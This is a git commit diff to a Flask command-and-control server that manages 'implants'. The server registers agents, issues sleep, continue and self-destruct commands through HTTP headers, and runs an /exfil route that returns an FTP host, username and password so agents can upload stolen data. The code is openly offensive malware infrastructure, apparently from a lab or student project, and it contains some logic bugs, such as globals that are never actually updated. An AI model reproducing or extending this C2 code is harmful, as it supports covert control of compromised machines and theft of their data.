afbd6b67c1fbf6e3f4d6d1f408fa0225f0cdea79
ehsu4220 <31673535+ehsu4220@users.noreply.github.com>
2023-05-13 23:50:52 -0400

    Fixed to use headers
    Previously was not using headers, this caused the implant to never change from sleeping

--- server_listener.py
+++ server_listener.py
@@ -1,4 +1,4 @@
-from flask import Flask, request, make_response
+from flask import Flask, request, make_response, render_template
 
 app = Flask(__name__)
 
@@ -13,14 +13,12 @@ kill_implants = False
 ## Manually send post to initialize self-destruct
 @app.route('/manual_kill', methods=['POST'])
 def self_destruct():
-    data = request.json
     kill_implants = True
     return make_response(1)
 
 ## Manually send post to indicate that data is incorrect
 @app.route('/manual_badData', methods=['POST'])
 def cleared_data():
-    data = request.json
     data_found = False
     return make_response(1)
 
@@ -28,19 +26,20 @@ def cleared_data():
 # Route to register a new agent session
 @app.route('/register', methods=['POST'])
 def register():
-    data = request.json
-    agent_id = data['agent_id']
-    command = data['command']
+    agent_id = request.form['agent_id']
+    command = request.form['command']
     agents[agent_id] = {'agent_id': agent_id,
                             'command' : command}
-    return make_response({'cmd' : 1})
+    response = make_response()
+    response.headers['cmd'] = 1
+    return response
+
 
 # Route to receive commands from an agent
 @app.route('/command', methods=['POST'])
 def command():
     # Send a command to a session
-    data = request.json
-    agent_id = data['agent_id']
+    agent_id = request.form['agent_id']
     # Send the command to the agent associated with the session ID
     if agent_id in agents.keys():
 
@@ -49,38 +48,42 @@ def command():
         ## 0 - sleep
         ## 1 - continue
         ## 2 - self-destruct
+        response = make_response()
         if data_found:
-            response = make_response({'cmd' : 0})
-            agents[agent_id] = 0
+            response.headers['cmd'] = 0
+            agents[agent_id]['command'] = 0
         elif kill_implants:
-            response = make_response({'cmd' : 2})
-            agents[agent_id] = 2
+            response.headers['cmd'] = 2
+            agents[agent_id]['command'] = 2
         else:
-            response = make_response({ 'cmd' : 1})
-            agents[agent_id] = 1
+            response.headers['cmd'] = 1
+            agents[agent_id]['command'] = 1
     
     return response
 
 # Route to receive exfiltrated data from an agent
 @app.route('/exfil', methods=['POST'])
 def exfil():
-    data = request.json
-    agent_id = data['agent_id']
-    found = data['found']
+    agent_id = request.form['agent_id']
+    found = int(request.form['found'])
+    response = make_response()
     if agent_id in agents:
         if found == 1:
             data_found = True
-            response = make_response({'host' : '192.168.68.128',
-                                    'username' : 'ftpwebuser',
-                                    'password' : 'password'})
-            agents[agent_id] = 0
+            response.headers['host'] = '192.168.68.128'
+            response.headers['username'] = 'ftpwebuser'
+            response.headers['password'] = 'password'
+            response.headers['cmd'] = 0
+            agents[agent_id]['command'] = 0
         else:
-            response = make_response({'cmd' : 2})
-            agents[agent_id] = 2
+            response.headers['cmd'] = 0
+            agents[agent_id]['command'] = 2
+    else:
+        response.headers['cmd'] = 1
 
     return response
 
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=8080)
+    app.run(debug=True, host='192.168.68.128', port=8080)
     app.run(debug=True, host='0.0.0.0', port=20)
     app.run(debug=True, host='0.0.0.0', port=21)
